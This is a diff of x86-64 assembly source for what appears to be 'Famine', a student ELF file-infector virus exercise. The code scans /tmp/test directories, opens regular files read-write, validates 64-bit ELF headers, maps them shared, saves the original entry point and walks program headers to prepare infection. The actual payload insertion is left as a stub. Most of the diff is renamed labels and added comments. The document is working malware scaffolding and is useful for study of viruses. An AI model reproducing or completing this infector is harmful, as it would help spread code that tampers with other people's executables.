@@ -11,61 +11,89 @@ section .text
     dirs db         "/tmp/test",0,"/tmp/test2",0,0
 
     _start:
+    ; this trick allows us to access Famine members using the VAR macro
     mov rbp, rsp
-    sub rbp, famine_size            ;generate stack
+    sub rbp, Famine_size            ; allocate Famine struct on stack
 
     ;load dirs
-    lea rdi, [dirs]  
-    
+    lea rdi, [dirs]
+
     .open_dir:
-        ; rdi = dir name pointer
-        mov r14, rdi
-        mov VAR(famine.dir_name_pointer), rdi
+
+        ; save dirname pointer to iterate after
+        mov VAR(Famine.dir_name_pointer), rdi
+
+        ; if (dirname == NULL), end
         cmp byte [rdi], 0
         je .exit
-        mov rax, SC_OPEN
+
+        ; open(rdi, O_RDONLY | O_DIRECTORY);
         mov rsi, O_RDONLY | O_DIRECTORY
+        mov rax, SC_OPEN
         syscall
         test rax, rax
         jl .next_dir
-        mov VAR(famine.fd_dir), rax
 
+        ; save fd
+        mov VAR(Famine.fd_dir), rax
+
+        ; get directory entry
         .dirent:
-            mov rax, SC_GETDENTS64
-            mov rdi, VAR(famine.fd_dir)
-            lea rsi, VAR(famine.dirent_struc)
+
+            ; getdents64(fd_dir, dirent_buffer, sizeof(dirent_buffer));
+            mov rdi, VAR(Famine.fd_dir)
+            lea rsi, VAR(Famine.dirent_struc)
             mov rdx, 1024
+            mov rax, SC_GETDENTS64
             syscall
             test rax, rax
             jle .close_dir
-            xor r12, r12            
+
+            xor r12, r12
+
+        ; getdents64 does not return one directory entry. It returns as many directory entries as it can
+        ; fit in the buffer passed. This is why the following iteration checks N directory entries and not just one.
 
         ; rdi = dirent_struct[0]
-        ; r12 = offset to dirent_struc node
+        ; r12 = offset from dirent_struct[0]
         ; rax = total bytes read in getdents
-        .validate_files_types:
+        .check_for_files_in_dirents:
+
+            ; if offset == total_bytes, next entry.
             cmp r12, rax
             jge .dirent
-            lea rdi, VAR(famine.dirent_struc)
+
+            ; shift offset from the start of the dirent struct array
+            lea rdi, VAR(Famine.dirent_struc)
             add rdi, r12
+
+            ; add lenght of directory entry to offset
             movzx ecx, word [rdi + dirent.d_len]
             add r12, rcx
+
+            ; check if the file is DT_REG
             cmp byte [rdi + dirent.d_type], DT_REG
-            jne .validate_files_types
+            jne .check_for_files_in_dirents
+
             add rdi, dirent.d_name
 
             .openat:
+                ; ?? pq se pushea el rax aqui ?
                 push rax
+
+                ; openat(fd_dir, d_name (&rsi), O_RDWR);
+                mov rdi, VAR(Famine.fd_dir)
                 lea rsi, [rdi]
-                mov rdi, VAR(famine.fd_dir)
-                mov rdx, O_RDWR 
+                mov rdx, O_RDWR
                 mov rax, SC_OPENAT
                 syscall
                 test rax, rax
                 jle .skip_file
-                mov VAR(famine.fd_file), rax
-                
+
+                mov VAR(Famine.fd_file), rax
+
             .fstat:
+
                 sub rsp, 144                ;fstat struct buffer
                 mov rdi, rax
                 lea rsi, [rsp]
@@ -73,77 +101,75 @@ section .text
                 syscall
                 test rax, rax
                 jl .end_fstat
-                
+
                 ; file type
-                mov eax, dword [rsp + 24]   ; st-mode fstat struct 
+                mov eax, dword [rsp + 24]   ; st-mode fstat struct
                 and eax, S_IFMT             ; bytes file type
                 cmp eax, S_IFREG            ; reg file type
                 jne .close_file
                 mov rax, [rsp + 48]
-                mov VAR(famine.file_original_len), rax 
-                jmp .magic_numbers
-                
+                mov VAR(Famine.file_original_len), rax
+                jmp .check_ehdr
+
                 .end_fstat:
                     add rsp, 144
-                    jmp .close_file 
+                    jmp .close_file
 
-            .magic_numbers:
-                mov rdi, VAR(famine.fd_file)
-                sub rsp, 64                     ;elf_ehdr struct buffer
-                lea rsi, [rsp]
-                ;lea rsi, VAR(famine.elf_ehdr)
-                mov rdx, 64   
+            .check_ehdr:
+
+                ; read(fd_file, rsi, 64);
+                mov rdi, VAR(Famine.fd_file)
+                sub rsp, Elf64_Ehdr_size        ; alloc sizeof(Elf64_Ehdr) on stack
+                lea rsi, [rsp]                  ; rsi = &rsp
+                mov rdx, Elf64_Ehdr_size
                 mov rax, SC_READ
                 syscall
-                ; Magic numbers
-                cmp dword [rsp], MAGIC_NUMBERS
-                jne .exit_magic_numbers
-                ; 64 bits
-                cmp byte [rsp + 4], 2     ;EI_CLASS
-                jne .exit_magic_numbers
-                ; Little endian
-                cmp byte [rsp + 5], 1     ;EI_DATA (little endian)
-                jne .exit_magic_numbers
+
+                cmp byte [rsp], 0x7F           ; magic number
+                jne .check_ehdr_error
+
+                cmp dword [rsp + 1], 0x464C45  ; "ELF"
+                jne .check_ehdr_error
+
+                cmp byte [rsp + 4], 2     ; EI_CLASS = 64 bits
+                jne .check_ehdr_error
+
+                cmp byte [rsp + 5], 1     ; EI_DATA = little endian
+                jne .check_ehdr_error
+
                 add rsp, 64
                 jmp .mmap
-            
-                .exit_magic_numbers:
+
+                .check_ehdr_error:
                     add rsp, 64
                     jmp .close_file
 
-            ; .fchmod:
-            ;     mov rdi, VAR(famine.fd_file)
-            ;     mov rsi, 0o777
-            ;     mov rax, SC_FCHMOD
-            ;     syscall
-
             .mmap:
+                ; mmap(NULL, file_original_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd_file, 0)
                 mov rdi, 0x0
-                mov rsi, VAR(famine.file_original_len)
+                mov rsi, VAR(Famine.file_original_len)
                 mov rdx, PROT_READ | PROT_WRITE
-                mov r10, 0x02
-                mov r8, VAR(famine.fd_file)
+                mov r10, MAP_SHARED
+                mov r8, VAR(Famine.fd_file)
                 mov r9, 0x0
                 mov rax, SC_MMAP
                 syscall
                 test rax, rax
                 jle .close_file
-                mov VAR(famine.mmap_pointer), rax 
+                mov VAR(Famine.mmap_pointer), rax   ; save mmap_pointer
 
             .infect:
-                ; rax = mmap pointer
-                mov rbx, [rax + elf64_ehdr.e_entry]
-                mov VAR(famine.original_entry), rbx
 
-                ; rbx = &(rax + e_phoff)
-                lea rbx, [rax + elf64_ehdr.e_phoff]
-                ; rbx = rax + *(rbx)
-                mov rbx, [rbx]
+                mov rbx, [rax + Elf64_Ehdr.e_entry] ; rbx = &(rax + e_entry)
+                mov VAR(Famine.original_entry), rbx ; save original_entry
+
+                lea rbx, [rax + Elf64_Ehdr.e_phoff] ; rbx = &(rax + e_phoff)
+                mov rbx, [rbx]                      ; rbx = rax + *(rbx)
                 add rbx, rax
-                movzx eax, word [rax + elf64_ehdr.e_phnum]
-                
+                movzx eax, word [rax + Elf64_Ehdr.e_phnum]
+
                 ;rax = phnum
-                ;rbx = phdr_pointer                
+                ;rbx = phdr_pointer
                 .loop_phdr:
                     cmp rax, 0
                     jle .end_loop_phdr
@@ -158,7 +184,7 @@ section .text
 
                 .next_phdr:
                     dec rax
-                    add rbx, 56 ; siguiente nodo del phdr
+                    add rbx, Elf64_Phdr_size ; siguiente nodo del phdr
                     jmp .loop_phdr
 
 
@@ -167,7 +193,7 @@ section .text
                     ; lo que sea
 
             .close_file:
-                mov rdi, VAR(famine.fd_file)
+                mov rdi, VAR(Famine.fd_file)
                 mov rax, SC_CLOSE
                 syscall
 
@@ -178,19 +204,19 @@ section .text
         ; .next_file:
         ;     cmp r12, rax
         ;     jge .validate_files_types
-        
+
         .skip_file:
             pop rax
-            jmp .validate_files_types
+            jmp .check_for_files_in_dirents
 
         .close_dir:
             mov rax, SC_CLOSE
-            mov rdi, VAR(famine.fd_dir)
+            mov rdi, VAR(Famine.fd_dir)
             syscall
 
         .next_dir:
-            mov rsi, r14
-        
+            mov rsi, VAR(Famine.dir_name_pointer)
+
         .find_null:
             lodsb               ; al = *rsi++
             test al, al
@@ -203,5 +229,3 @@ section .text
         .exit:
             mov rax, SC_EXIT
             syscall
-    
-    infect:
